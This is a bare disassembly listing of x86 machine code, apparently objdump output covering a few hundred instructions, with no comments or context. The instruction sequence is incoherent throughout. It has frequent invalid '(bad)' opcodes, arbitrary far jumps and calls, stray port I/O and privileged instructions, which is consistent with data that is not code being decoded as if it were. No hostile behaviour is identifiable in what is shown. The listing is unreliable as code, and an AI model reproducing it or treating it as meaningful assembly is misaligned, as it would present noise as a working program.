  4246f1:	mov    dl,0x90
  4246f3:	(bad)  [ecx+0x55867d31]
  4246f9:	sbb    eax,0x79d2f621
  4246fe:	dec    edi
  4246ff:	xchg   ebx,eax
  424700:	mov    dh,0x6e
  424702:	jnp    0x424702
  424704:	push   ebx
  424705:	adc    ebx,0xe43e0e61
  42470b:	aam    0x4e
  42470d:	xchg   esp,eax
  42470e:	dec    edi
  42470f:	outs   dx,BYTE PTR ds:[esi]
  424710:	and    dh,ah
  424712:	rcl    DWORD PTR [edx],1
  424714:	repz push esi
  424716:	xchg   ebp,eax
  424717:	dec    ebx
  424718:	inc    edx
  424719:	hlt    
  42471a:	mov    ah,0xe8
  42471c:	xor    ecx,DWORD PTR [esi-0xc]
  42471f:	mov    eax,0xcc717807
  424724:	cdq    
  424725:	inc    ecx
  424726:	mov    dh,0x8
  424728:	aad    0xc3
  42472a:	dec    ebx
  42472b:	cli    
  42472c:	and    bl,BYTE PTR [ebp+edx*1+0x67813c19]
  424733:	cmp    dl,BYTE PTR [edi]
  424735:	daa    
  424736:	ins    BYTE PTR es:[edi],dx
  424737:	mov    esi,0x71d47d1d
  42473c:	jge    0x42474c
  42473e:	ss dec edx
  424740:	push   es
  424741:	sar    BYTE PTR [ecx],cl
  424743:	mov    BYTE PTR [ecx-0xa026678],dl
  424749:	aas    
  42474a:	inc    edi
  42474b:	xchg   edx,eax
  42474c:	inc    ecx
  42474d:	mov    esi,ds
  42474f:	je     0x4247bb
  424751:	aaa    
  424752:	or     BYTE PTR [ebp-0x60],bh
  424755:	sbb    eax,0x555b3b2f
  42475a:	leave  
  42475b:	ret    
  42475c:	outs   dx,BYTE PTR ds:[esi]
  42475d:	je     0x42477c
  42475f:	mov    dl,0xc3
  424761:	cmp    al,0xd9
  424763:	cmp    DWORD PTR [ecx+0x4e9c32fe],ebx
  424769:	leave  
  42476a:	mov    esp,0xee751c95
  42476f:	leave  
  424770:	xchg   BYTE PTR [edi],cl
  424772:	xchg   DWORD PTR [eax-0x25c4d280],ecx
  424778:	inc    ecx
  424779:	or     eax,0xc60378d6
  42477f:	(bad)  
  424780:	ins    DWORD PTR es:[edi],dx
  424781:	fwait
  424782:	pushf  
  424783:	xchg   edx,ebx
  424785:	and    BYTE PTR [ecx+0x6eecf6cb],cl
  42478b:	adc    DWORD PTR [edx-0x4ba6edf9],edi
  424791:	std    
  424792:	inc    ebx
  424793:	ins    BYTE PTR es:[edi],dx
  424794:	xor    al,0x8f
  424796:	pop    edi
  424797:	pusha  
  424798:	(bad)  
  424799:	les    ebp,FWORD PTR [edx-0x4949170]
  42479f:	les    esp,FWORD PTR [esi+ecx*4]
  4247a2:	xchg   ebx,eax
  4247a3:	adc    al,0xc7
  4247a5:	idiv   ecx
  4247a7:	mov    edx,0xb3596d6b
  4247ac:	or     al,0x5c
  4247ae:	std    
  4247af:	addr16 dec edi
  4247b1:	repz les ebp,FWORD PTR [esi+esi*8]
  4247b5:	sbb    al,BYTE PTR [edx]
  4247b7:	adc    dh,BYTE PTR [ebp+0x4a4b49ba]
  4247bd:	int    0x5c
  4247bf:	xchg   ebx,eax
  4247c0:	mov    cl,0xd4
  4247c2:	xor    eax,0x47d01fa0
  4247c7:	xchg   esp,eax
  4247c8:	inc    eax
  4247c9:	inc    edi
  4247ca:	sbb    eax,0xa47137d5
  4247cf:	sbb    BYTE PTR [ebp+ebp*1-0x44],bl
  4247d3:	test   eax,0x2bb75cb6
  4247d8:	(bad)  
  4247d9:	push   0xffffff8e
  4247db:	push   ebp
  4247dc:	stos   BYTE PTR es:[edi],al
  4247dd:	das    
  4247de:	cli    
  4247df:	or     eax,0x45feffdc
  4247e4:	pop    esi
  4247e5:	repz mov edi,0xf2214abf
  4247eb:	fnsave [eax+0x64]
  4247ee:	ficomp DWORD PTR [esi]
  4247f0:	out    0x2c,eax
  4247f2:	vmwrite esp,DWORD PTR [edi-0x5a]
  4247f6:	aam    0xb4
  4247f8:	mov    ecx,0x159ee4a1
  4247fd:	jge    0x42486f
  4247ff:	(bad)  
  424800:	dec    esp
  424801:	inc    edi
  424802:	dec    eax
  424803:	or     esi,edx
  424805:	sub    eax,DWORD PTR [eax-0x4d]
  424808:	sahf   
  424809:	(bad)  
  42480a:	mov    WORD PTR [eax+edx*1-0x4b],?
  42480e:	push   ds
  42480f:	inc    ebp
  424810:	(bad)  [ebx+0x6ec28498]
  424816:	push   edx
  424817:	imul   eax,DWORD PTR [ebx]
  42481a:	repz jle 0x424819
  42481d:	adc    al,0xc4
  42481f:	mov    ebx,DWORD PTR [bx]
  424822:	stos   DWORD PTR es:[edi],eax
  424823:	mov    ds:0x1c75ae4c,al
  424828:	fild   WORD PTR [ebx-0x29]
  42482b:	imul   ecx,DWORD PTR [edi-0x4798da61],0x2ff4f913
  424835:	call   0x5d6a:0xf911c6db
  42483c:	jmp    0x3d73:0xb377cd28
  424843:	stos   DWORD PTR es:[edi],eax
  424844:	adc    cl,ah
  424846:	scas   eax,DWORD PTR es:[edi]
  424847:	ret    
  424848:	mov    esi,0xd7f11c99
  42484d:	jo     0x4247f4
  42484f:	nop
  424850:	ud2    
  424852:	mov    eax,ds:0x662436c8
  424857:	dec    eax
  424858:	add    eax,0x29c5832b
  42485d:	adc    ch,BYTE PTR [edi]
  42485f:	inc    ebx
  424860:	cmc    
  424861:	cmp    al,0x9c
  424863:	jge    0x424894
  424865:	xchg   esp,eax
  424866:	enter  0xd151,0x4
  42486a:	ja     0x42480f
  42486c:	pop    edi
  42486d:	sub    BYTE PTR [ecx],bh
  42486f:	mov    gs,WORD PTR [ebp+0x39]
  424872:	or     ecx,DWORD PTR ds:0x8255d3de
  424878:	jns    0x4248b3
  42487a:	mov    ds:0xbf33fff9,eax
  42487f:	call   0x282:0x81435836
  424886:	lods   al,BYTE PTR ds:[esi]
  424887:	or     eax,0xb5ddf294
  42488c:	rol    eax,cl
  42488e:	hlt    
  42488f:	mov    dh,0xf4
  424891:	test   al,0x17
  424893:	mov    bh,0xab
  424895:	and    bh,cl
  424897:	loopne 0x42483b
  424899:	aas    
  42489a:	xor    ebp,ebp
  42489c:	sbb    dl,BYTE PTR [edx-0x74cbb00d]
  4248a2:	xchg   esp,eax
  4248a3:	sbb    ebp,DWORD PTR gs:[edx-0x1e640e87]
  4248aa:	mov    esp,0x1572e286
  4248af:	fadd   QWORD PTR ds:0xa5674a17
  4248b5:	mov    esp,0x4f91e8c3
  4248ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248bb:	cdq    
  4248bc:	ds cs push edi
  4248bf:	push   ss
  4248c0:	dec    ebp
  4248c1:	pop    es
  4248c2:	pop    ds
  4248c3:	js     0x42493f
  4248c5:	jns    0x424899
  4248c7:	data16 into 
  4248c9:	das    
  4248ca:	or     al,0x3e
  4248cc:	jp     0x4248a6
  4248ce:	mov    ch,0x3b
  4248d0:	loope  0x4248f7
  4248d2:	pop    ebp
  4248d3:	dec    edx
  4248d4:	out    dx,al
  4248d5:	sbb    BYTE PTR ds:0x5957b9bc,0x86
  4248dc:	adc    al,0x80
  4248de:	mov    al,ds:0x90f69146
  4248e3:	in     al,dx
  4248e4:	popa   
  4248e5:	(bad)  
  4248e6:	cmp    DWORD PTR [edx+0x78],0x1847d882
  4248ed:	ss inc ebp
  4248ef:	sahf   
  4248f0:	and    eax,0x5b3515a1
  4248f5:	mov    DWORD PTR fs:[ebx+0x7fc638a4],ebp
  4248fc:	addr16 test ebx,edi
  4248ff:	stos   BYTE PTR es:[edi],al
  424900:	adc    eax,0x64c7972e
  424905:	cli    
  424906:	es scas eax,DWORD PTR es:[edi]
  424908:	mov    dh,0xc0
  42490a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42490b:	push   esp
  42490c:	mov    WORD PTR [eax+ebp*8],ss
  42490f:	cmp    ch,BYTE PTR [ecx]
  424911:	push   eax
  424912:	pop    edi
  424913:	add    cl,BYTE PTR [ebx-0x6b]
  424916:	push   edi
  424917:	(bad)  
  424918:	in     eax,dx
  424919:	enter  0xac24,0x2
  42491d:	aad    0xa7
  42491f:	lds    ecx,FWORD PTR [eax+0x6b1efd6c]
  424925:	out    0x90,eax
  424927:	test   al,0x18
  424929:	inc    esi
  42492a:	jl     0x4248c4
  42492c:	jo     0x424940
  42492e:	add    BYTE PTR [eax],al
  424930:	add    BYTE PTR [eax],al
  424932:	adc    ecx,DWORD PTR [ebp-0x104094d7]
  424938:	push   ebx
  424939:	std    
  42493a:	and    ebp,DWORD PTR [ebx-0x25]
  42493d:	mov    BYTE PTR [eax+0x393f9198],0xc2
  424944:	add    DWORD PTR [eax],eax
  424946:	hlt    
  424947:	add    al,0x0
  424949:	add    bh,dl
  42494b:	inc    edx
  42494c:	inc    BYTE PTR [eax-0x67]
  42494f:	mov    bl,0xd
  424951:	push   ss
  424952:	imul   eax,DWORD PTR [ebx+0x26],0x83e8d021
  424959:	stos   BYTE PTR es:[edi],al
  42495a:	inc    ebx
  42495b:	and    dl,bh
  42495d:	and    al,0xaa
  42495f:	lods   eax,DWORD PTR ds:[esi]
  424960:	adc    DWORD PTR [eax+0x26],0xffffffca
  424964:	mov    cl,0x9a
  424966:	jns    0x4249c1
  424968:	or     DWORD PTR [edx],0x1d
  42496b:	jmp    0x79ebecab
  424970:	and    DWORD PTR [ecx],edx
  424972:	enter  0x7a99,0xf7
  424976:	rcl    DWORD PTR [edx+0x755fa85b],1
  42497c:	push   edx
  42497d:	sub    ecx,0x8b0d5df9
  424983:	xchg   DWORD PTR [edx-0x6e6fe67e],ebx
  424989:	push   edi
  42498a:	mov    WORD PTR [eax],fs
  42498c:	ja     0x42496e
  42498e:	xlat   BYTE PTR ds:[ebx]
  42498f:	push   edx
  424990:	and    bl,dl
  424992:	in     al,0x1d
  424994:	push   es
  424995:	(bad)  
  424996:	es mov ch,0x61
  424999:	jno    0x42494f
  42499b:	popf   
  42499c:	repz xchg ebp,eax
  42499e:	ds jmp 0x815e74ff
  4249a4:	pop    bx
  4249a6:	inc    DWORD PTR [esi]
  4249a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249a9:	dec    eax
  4249aa:	in     eax,0x9c
  4249ac:	xchg   DWORD PTR [ecx],ebp
  4249ae:	fild   QWORD PTR [edi-0x74964246]
  4249b4:	stos   BYTE PTR es:[edi],al
  4249b5:	scas   eax,DWORD PTR es:[edi]
  4249b6:	xor    esi,DWORD PTR [ebp+0x2cef813d]
  4249bc:	mov    edx,edi
  4249be:	fiadd  DWORD PTR [esi]
  4249c0:	dec    edi
  4249c2:	mov    edx,0xf82c1620
  4249c7:	imul   ecx,ecx,0x221b3cb2
  4249cd:	inc    eax
  4249ce:	mov    ds:0x52882ecc,al
  4249d3:	adc    ch,BYTE PTR [edx]
  4249d5:	neg    DWORD PTR [ebp+0x6772ab0b]
  4249db:	int3   
  4249dc:	div    DWORD PTR [esi+0x6c]
  4249df:	fisttp QWORD PTR [edx-0x76]
  4249e2:	mov    bh,BYTE PTR [esi-0x42c3d28d]
  4249e8:	sub    DWORD PTR [edx+ecx*4],ebx
  4249eb:	cmp    al,0x8e
  4249ed:	pop    edi
  4249ee:	rcl    dh,1
  4249f0:	add    ecx,0x334a352e
  4249f6:	and    cl,cl
  4249f8:	ins    BYTE PTR es:[edi],dx
  4249f9:	dec    esp
  4249fa:	inc    ecx
  4249fb:	in     eax,0x9d
  4249fd:	or     ebx,DWORD PTR [ebx+0x2f]
  424a00:	dec    esp
  424a01:	and    eax,0x2ac43bd2
  424a06:	pop    edx
  424a07:	push   0x6f
  424a09:	cmp    cl,dl
  424a0b:	mul    BYTE PTR [edx+0x35]
  424a0e:	repnz fadd DWORD PTR [ebp+0x4a]
  424a12:	inc    edx
  424a13:	mov    al,0x6d
  424a15:	mov    bh,0xf5
  424a17:	dec    esp
  424a18:	dec    edx
  424a19:	cmp    bl,bh
  424a1b:	mov    ah,0xa6
  424a1d:	push   ds
  424a1e:	test   edx,edi
  424a20:	push   ss
  424a21:	pusha  
  424a22:	pop    ss
  424a23:	in     al,0xe
  424a25:	fistp  WORD PTR [eax+edi*1+0x60e5ba20]
  424a2c:	jne    0x424aa7
  424a2e:	(bad)  
  424a2f:	mov    dh,0xc9
  424a31:	mov    dl,0x5f
  424a33:	test   BYTE PTR [edx],0x77
  424a36:	neg    BYTE PTR [edx-0x39]
  424a39:	xlat   BYTE PTR ds:[ebx]
  424a3a:	adc    BYTE PTR [ebp-0x4a],bh
  424a3d:	dec    edi
  424a3e:	jae    0x424a43
  424a40:	test   ah,dh
  424a42:	js     0x4249ed
  424a44:	cli    
  424a45:	neg    DWORD PTR [ecx-0x30]
  424a48:	ins    DWORD PTR es:[edi],dx
  424a49:	xor    eax,0xfa424d21
  424a4e:	push   es
  424a4f:	nop
  424a50:	cmp    DWORD PTR [ecx+0xa3720de],eax
  424a56:	mov    bl,ah
  424a58:	jmp    0x55d7:0xc2837ba5
  424a5f:	cmp    ah,BYTE PTR [edi]
  424a61:	(bad)  
  424a63:	je     0x424a3c
  424a65:	xchg   esp,eax
  424a66:	sbb    al,0x41
  424a68:	retf   
  424a69:	out    dx,eax
  424a6a:	sub    eax,0xa2ce6ab7
  424a6f:	frstor [esi]
  424a71:	mov    ebx,0x99d91318
  424a76:	jle    0x424aab
  424a78:	mov    ecx,0xc5593cff
  424a7d:	sub    DWORD PTR [edi-0x19578dee],edi
  424a83:	and    esp,DWORD PTR [ebx-0x64]
  424a86:	xor    BYTE PTR [ebp-0x6a],0x3c
  424a8a:	add    BYTE PTR [edx+0x604fd764],bh
  424a90:	in     eax,dx
  424a91:	stc    
  424a92:	xchg   edx,eax
  424a93:	mov    edx,0x34a4466
  424a98:	jae    0x424abd
  424a9a:	pop    es
  424a9b:	mov    BYTE PTR ds:0x181af03c,dl
  424aa1:	and    ecx,DWORD PTR ds:0xaf4c795a
  424aa7:	mov    bh,0xa9
  424aa9:	mov    ah,0x2b
  424aab:	aam    0x71
  424aad:	or     ebp,DWORD PTR [ecx-0x32c7c815]
  424ab3:	add    ebp,ecx
  424ab5:	xchg   bh,al
  424ab7:	test   al,0xc5
  424ab9:	inc    ebp
  424aba:	add    DWORD PTR [edx+0x27fd22db],ebx
  424ac0:	sbb    ch,BYTE PTR ds:0x5aeb407b
  424ac6:	dec    ebp
  424ac7:	inc    edx
  424ac8:	(bad)  
  424ac9:	mov    al,ds:0x5d4aba91
  424ace:	repnz in eax,dx
  424ad0:	jnp    0x424a89
  424ad2:	jmp    0x7bd9:0x987c49b
  424ad9:	sub    eax,0xaea8537
  424ade:	adc    esp,ebx
  424ae0:	pop    eax
  424ae1:	mov    edi,0x20b4f510
  424ae6:	lds    esi,FWORD PTR [edx+0x79ee1ae9]
  424aec:	leave  
  424aed:	or     eax,edi
  424aef:	inc    edi
  424af0:	sbb    eax,0x8c088032
  424af5:	stos   DWORD PTR es:[edi],eax
  424af6:	xchg   BYTE PTR [edx],bl
  424af8:	fisttp WORD PTR [ebp+0x7e]
  424afb:	add    bl,BYTE PTR [ecx+0x5d]
  424afe:	out    0xb4,al
  424b00:	push   0xffffffa8
  424b02:	shl    DWORD PTR [ebx-0x9],0xd1
  424b06:	pop    ebx
  424b07:	xor    ch,BYTE PTR [edi-0x52]
  424b0a:	and    BYTE PTR [eax-0x18],dh
  424b0d:	jl     0x424b49
  424b0f:	js     0x424b32
  424b11:	addr16 push ebp
  424b13:	imul   eax,DWORD PTR [edx+0x16],0xea075cab
  424b1a:	jge    0x424b8f
  424b1c:	cmp    bl,BYTE PTR [ebp+0x43]
  424b1f:	inc    edx
  424b20:	add    al,0xf2
  424b22:	mov    WORD PTR [eax-0x2157b924],?
  424b28:	pop    ecx
  424b29:	xor    eax,0x61fa6b13
  424b2e:	ret    0xcca9
  424b31:	cmp    al,0x5c
  424b33:	cwde   
  424b34:	jnp    0x424b7d
  424b36:	fwait
  424b37:	es adc ecx,ebp
  424b3a:	mov    bh,0x99
  424b3c:	fisttp QWORD PTR [esp+edx*8+0x4f]
  424b40:	inc    esp
  424b41:	je     0x424b70
  424b43:	sbb    al,0x99
  424b45:	cmc    
  424b46:	(bad)  
  424b47:	mov    edx,0x65092354
  424b4c:	sub    DWORD PTR [ebp+0x8],edi
  424b4f:	outs   dx,BYTE PTR ds:[esi]
  424b50:	xchg   DWORD PTR [eax-0x2c],ebp
  424b53:	xor    al,0x49
  424b55:	imul   eax,DWORD PTR [esi-0x58],0x17f251a
  424b5c:	cmp    eax,0xf33c404b
  424b61:	stos   DWORD PTR es:[edi],eax
  424b62:	mov    eax,0x1ec24734
  424b67:	repz jbe 0x424af3
  424b6a:	pop    eax
  424b6b:	push   esi
  424b6c:	stc    
  424b6d:	fisub  WORD PTR [ebx+ebp*2+0x626ed4ab]
  424b74:	mov    edx,0xf88ccbf8
  424b79:	sbb    DWORD PTR [edx+0x1e],edx
  424b7c:	pop    ds
  424b7d:	rcl    DWORD PTR [ecx-0x23e83600],0x7b
  424b84:	and    DWORD PTR [edi],edi
  424b86:	in     eax,0xd8
  424b88:	xchg   DWORD PTR [ebx],edx
  424b8a:	adc    eax,0x54685837
  424b8f:	cli    
  424b90:	xor    DWORD PTR [ecx],0xffffffcd
  424b93:	stos   DWORD PTR es:[edi],eax
  424b94:	dec    esi
  424b95:	add    dh,BYTE PTR [edx+0x5f]
  424b98:	and    ch,BYTE PTR [ebp-0x3]
  424b9b:	stos   DWORD PTR es:[edi],eax
  424b9c:	and    al,0x51
  424b9e:	mov    eax,ds:0xdb8a428e
  424ba3:	mov    DWORD PTR [edx-0x42],ebp
  424ba6:	xor    BYTE PTR [ebp-0x21],dl
  424ba9:	cmc    
  424baa:	ret    0xc786
  424bad:	adc    BYTE PTR [edx-0x1],bh
  424bb0:	or     DWORD PTR [eax-0x6c7c5423],ebp
  424bb6:	cli    
  424bb7:	mov    edi,0x12668ba7
  424bbc:	icebp  
  424bbd:	jmp    0x424c0f
  424bbf:	aam    0xe5
  424bc1:	xor    eax,0x885d783c
  424bc6:	test   al,0x3f
  424bc8:	stos   BYTE PTR es:[edi],al
  424bc9:	mov    ebx,0xfc54caf0
  424bce:	sub    dh,BYTE PTR [esi+0x46]
  424bd1:	stos   BYTE PTR es:[edi],al
  424bd2:	adc    eax,0xfde69e1f
  424bd7:	ins    BYTE PTR es:[edi],dx
  424bd8:	xchg   edi,eax
  424bd9:	dec    ebx
  424bda:	adc    DWORD PTR [ebx+0x3b],0x3ba75e95
  424be1:	mov    esp,0x9dcd45ae
  424be6:	xchg   ebx,eax
  424be7:	loop   0x424bbe
  424be9:	jp     0x424bb4
  424beb:	icebp  
  424bec:	fmulp  st(5),st
  424bee:	lods   al,BYTE PTR ds:[esi]
  424bef:	mov    DWORD PTR [esi+0x3f],ebp
  424bf2:	popa   
  424bf3:	cmp    BYTE PTR [esi-0x4d306f00],0x9
  424bfa:	loopne 0x424bcd
  424bfc:	enter  0xdd42,0xc2
  424c00:	xchg   esp,eax
  424c01:	bound  ebx,QWORD PTR [ecx+0x16]
  424c04:	dec    eax
  424c05:	icebp  
  424c06:	stos   BYTE PTR es:[edi],al
  424c07:	dec    esp
  424c08:	pusha  
  424c09:	mov    al,0x75
  424c0b:	fld    QWORD PTR [edx+0x39]
  424c0e:	mov    dh,0xab
  424c10:	jp     0x424c25
  424c12:	(bad)  
  424c13:	mov    dh,0x22
  424c15:	(bad)  
  424c16:	hlt    
  424c17:	adc    ebp,DWORD PTR [ebx+0x1e]
  424c1a:	adc    eax,0x85f2a88a
  424c1f:	fwait
  424c20:	in     al,0xa4
  424c22:	loopne 0x424c31
  424c24:	cmp    BYTE PTR [ebx-0x6e],al
  424c27:	xchg   edx,eax
  424c28:	push   0x4d
  424c2a:	xchg   esp,eax
  424c2b:	fiadd  WORD PTR [ebp-0x23c4133b]
  424c31:	(bad)
  424c34:	cmp    eax,0x4617c6b1
  424c39:	aaa    
  424c3a:	jne    0x424cb4
  424c3c:	jo     0x424c29
  424c3e:	fs adc ebp,eax
  424c41:	jae    0x424bcc
  424c43:	xor    al,0x2e
  424c45:	sub    DWORD PTR [esi],eax
  424c47:	sbb    eax,0x3e25eb4e
  424c4c:	or     DWORD PTR [ecx],ebx
  424c4e:	clc    
  424c4f:	xchg   edx,eax
  424c50:	mov    dl,dl
  424c52:	pop    es
  424c53:	dec    edi
  424c54:	sub    cl,dh
  424c56:	jl     0x424c8b
  424c58:	in     eax,0xc9
  424c5a:	xchg   esi,eax
  424c5b:	rol    BYTE PTR [esi-0x700e236f],1
  424c61:	xor    dl,dh
  424c63:	repz out 0xbf,al
  424c66:	mov    eax,DWORD PTR [edi-0x5d79d299]
  424c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c6d:	jle    0x424c4a
  424c6f:	fucomip st,st(3)
  424c71:	cld    
  424c72:	and    al,0xda
  424c74:	nop
  424c75:	jmp    0x7620:0x95b9a0b2
  424c7c:	pop    es
  424c7d:	push   esi
  424c7e:	arpl   WORD PTR [ebx+0x54],bx
  424c81:	inc    BYTE PTR [edi]
  424c83:	add    bh,BYTE PTR [ebx]
  424c85:	cmp    eax,0x1d06ea5c
  424c8a:	out    0xd3,al
  424c8c:	xchg   ebp,eax
  424c8d:	and    ch,BYTE PTR [ebx+0x1d]
  424c90:	(bad)  
  424c91:	pop    edx
  424c92:	call   0x57f5f420
  424c97:	or     al,ch
  424c99:	call   0x687d:0x1f07a561
  424ca0:	test   BYTE PTR [edi-0x24d89990],0x47
  424ca7:	jp     0x424c49
  424ca9:	ja     0x424cab
  424cab:	cmp    edx,DWORD PTR [ebx+eiz*4]
  424cae:	lds    ebp,FWORD PTR [edx-0x1e]
  424cb1:	ins    BYTE PTR es:[edi],dx
  424cb2:	pop    edi
  424cb3:	mov    ah,0xdf
  424cb5:	cmp    DWORD PTR [esi-0x6dfc57c3],ecx
  424cbb:	(bad)  
  424cbc:	(bad)  
  424cbd:	fidiv  WORD PTR [edi]
  424cbf:	pusha  
  424cc0:	or     esi,DWORD PTR [edi-0x62]
  424cc3:	mov    cl,0xe3
  424cc5:	mov    dh,0xd
  424cc7:	dec    ebp
  424cc8:	xor    BYTE PTR [edi+eax*2-0x48],dh
  424ccc:	sub    edi,ebp
  424cce:	aad    0xdf
  424cd0:	in     al,dx
  424cd1:	sub    ecx,DWORD PTR [ecx]
  424cd3:	push   ss
  424cd4:	test   eax,ecx
  424cd6:	dec    ecx
  424cd7:	ds mov ch,ch
  424cda:	pop    ecx
  424cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cdc:	push   edi
  424cdd:	jl     0x424cb6
  424cdf:	imul   edi,DWORD PTR [esi+0x75f87f1e],0x21
  424ce6:	and    eax,0xe1974ea2
  424ceb:	mov    al,ds:0xd0bdcae6
  424cf0:	adc    dl,0x20
  424cf3:	rcl    BYTE PTR [edx+0x21bee6d0],1
  424cf9:	jmp    0x933b:0x2aea2b6c
  424d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d01:	iret   
  424d02:	int    0xd1
  424d04:	scas   eax,DWORD PTR es:[edi]
  424d05:	jg     0x424d56
  424d07:	test   al,0xbd
  424d09:	jle    0x424d71
  424d0b:	pop    esi
  424d0c:	enter  0x198e,0x54
  424d10:	(bad)  
  424d11:	jbe    0x424d6a
  424d13:	jp     0x424cb5
  424d15:	rcr    BYTE PTR [eax-0x34347048],0x80
  424d1c:	stos   DWORD PTR es:[edi],eax
  424d1d:	mov    bl,0x3c
  424d1f:	fsub   QWORD PTR [edi+0x50574e83]
  424d26:	dec    esi
  424d27:	in     eax,0x99
  424d29:	daa    
  424d2a:	inc    ebp
  424d2b:	mov    ch,0x2a
  424d2d:	push   ecx
  424d2e:	or     BYTE PTR [ecx+0x6d],al
  424d31:	mov    ebx,DWORD PTR [edi]
  424d33:	jmp    0xb9b1:0xf9155379
  424d3a:	and    eax,0xf4bd4122
  424d3f:	push   ss
  424d40:	mov    ebp,DWORD PTR [esi]
  424d42:	in     eax,0xcb
  424d44:	loope  0x424d65
  424d46:	jbe    0x424d15
  424d48:	pop    ebx
  424d49:	add    ebx,DWORD PTR [ebx-0x274570fb]
  424d4f:	cld    
  424d50:	push   edi
  424d51:	mov    dh,0x5e
  424d53:	mov    bl,0xe0
  424d55:	loopne 0x424d29
  424d57:	addr16 jp 0x424d3a
  424d5a:	xor    bh,ah
  424d5c:	enter  0xb8db,0x9a
  424d60:	popf   
  424d61:	loop   0x424d2e
  424d63:	stos   DWORD PTR es:[edi],eax
  424d64:	or     bl,BYTE PTR [ebx-0xd9824c8]
  424d6a:	xchg   esi,eax
  424d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d6c:	sbb    dh,dl
  424d6e:	das    
  424d6f:	mov    dl,0xab
  424d71:	ds in  eax,0xfa
  424d74:	dec    esi
  424d75:	in     eax,0xaa
  424d77:	or     eax,0x9ea29929
  424d7c:	inc    esi
  424d7d:	test   BYTE PTR [eax],dl
  424d7f:	cmp    eax,0x62b6e874
  424d84:	mov    esi,0xadcf1314
  424d89:	aaa    
  424d8a:	sbb    eax,0x981693db
  424d8f:	dec    esi
  424d90:	xchg   ecx,eax
  424d91:	out    0x88,al
  424d93:	mov    ebp,0xf00b1df8
  424d98:	mov    ah,0x6e
  424d9a:	jmp    0xbdbe:0xd81aee68
  424da1:	adc    al,0xd9
  424da3:	ds ja  0x424e1a
  424da6:	mov    cl,0x7c
  424da8:	icebp  
  424da9:	test   eax,0x45163567
  424dae:	pop    eax
  424daf:	jmp    0xa561:0x21082a58
  424db6:	cmp    DWORD PTR [esi-0x34],ebx
  424db9:	push   esi
  424dba:	ins    BYTE PTR es:[edi],dx
  424dbb:	cs enter 0x2b15,0x71
  424dc0:	push   es
  424dc1:	and    BYTE PTR [esi],0x80
  424dc4:	mov    eax,ds:0x18b16458
  424dc9:	out    dx,eax
  424dca:	out    0xc,al
  424dcc:	pop    edx
  424dcd:	cmp    al,BYTE PTR [ecx]
  424dcf:	sub    al,0xa1
  424dd1:	pop    es
  424dd2:	dec    edi
  424dd3:	daa    
  424dd4:	es jmp 0x424dad
  424dd7:	cmc    
  424dd8:	cwde   
  424dd9:	cmp    al,0x25
  424ddb:	jge    0x424db0
  424ddd:	nop
  424dde:	jge    0x424ddf
  424de0:	test   al,0xb4
  424de2:	sbb    DWORD PTR [edx-0x617585d4],esp
  424de8:	ja     0x424dbb
  424dea:	jae    0x424dd9
  424dec:	fstp   QWORD PTR [eax]
  424dee:	test   eax,0x8055ec0d
  424df3:	xor    DWORD PTR [ecx+esi*2],edx
  424df6:	mov    ah,0x35
  424df8:	sub    eax,0x1bfe2306
  424dfd:	enter  0x75fb,0xa2
  424e01:	cmc    
  424e02:	clc    
  424e03:	gs es call 0xabe5:0x181a6295
  424e0c:	fnstsw WORD PTR [esi+0x7b4a6492]
  424e12:	shr    bl,cl
  424e14:	loop   0x424d9e
  424e16:	adc    BYTE PTR [esi+edx*2+0x1143fff],ah
  424e1d:	sahf   
  424e1e:	mov    ch,0x17
  424e20:	lahf   
  424e21:	pop    ds
  424e22:	lods   eax,DWORD PTR ds:[esi]
  424e23:	or     eax,0x6928f4dc
  424e28:	addr16 mov ebx,0x97178cca
  424e2e:	ret    
  424e2f:	mov    bl,0x7b
  424e31:	mov    ds:0x1470c4f7,eax
  424e36:	fbld   TBYTE PTR [ebx-0x70a124aa]
  424e3c:	cmp    ch,ah
  424e3e:	add    BYTE PTR [eax],al
  424e40:	add    BYTE PTR [eax],al
  424e42:	add    BYTE PTR [edi+ecx*2+0x7],0xcf
  424e47:	bswap  eax
  424e49:	(bad)  
  424e4a:	test   al,0x2c
  424e4c:	dec    eax
  424e4d:	or     ecx,ecx
  424e4f:	mov    bh,bh
  424e51:	sahf   
  424e52:	sub    eax,0xf40001c7
  424e57:	add    al,0x0
  424e59:	add    dh,dh
  424e5b:	daa    
  424e5c:	pop    eax
  424e5d:	push   ebp
  424e5e:	mov    dl,0x8
  424e60:	mov    ah,0xf7
  424e62:	(bad)  
  424e63:	cwde   
  424e64:	inc    ebp
  424e65:	call   0xeadf:0x1e3f5b6e
  424e6c:	dec    esi
  424e6d:	jg     0x424ec5
  424e6f:	sbb    eax,0x5c151a93
  424e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e75:	mov    cl,0x28
  424e77:	fiadd  WORD PTR [edx+0x108ef250]
  424e7d:	or     eax,0x611dfdf4
  424e82:	adc    ecx,DWORD PTR [ebp-0x7961217d]
  424e88:	xchg   esp,eax
  424e89:	mov    dl,0x51
  424e8c:	ds icebp 
  424e8e:	sahf   
  424e8f:	sub    edi,DWORD PTR [ebx+0x4d3f9126]
  424e95:	ja     0x424eda
  424e97:	dec    ebx
  424e98:	ret    0x7560
  424e9b:	in     al,dx
  424e9c:	fst    QWORD PTR [edi]
  424e9e:	ror    BYTE PTR [edx],1
  424ea0:	mov    ah,0xfb
  424ea2:	(bad)  
  424ea3:	lock or bh,BYTE PTR [edi]
  424ea6:	stos   DWORD PTR es:[edi],eax
  424ea7:	xchg   esp,eax
  424ea8:	push   ebp
  424ea9:	sbb    esp,DWORD PTR [ecx+edi*8+0x4]
  424ead:	mov    BYTE PTR [edx-0x7],bl
  424eb0:	push   es
  424eb1:	rcl    DWORD PTR [ecx+eiz*1+0x5f0a352e],1
  424eb8:	popf   
  424eb9:	es shl ebp,cl
  424ebc:	loop   0x424ee8
  424ebe:	icebp  
  424ebf:	sub    ebp,DWORD PTR [esi-0x31]
  424ec2:	push   0x22
  424ec4:	inc    edi
  424ec5:	sahf   
  424ec6:	lods   al,BYTE PTR ds:[esi]
  424ec7:	test   DWORD PTR [ebx+eax*4],0x5fc277d5
  424ece:	ret    0xf801
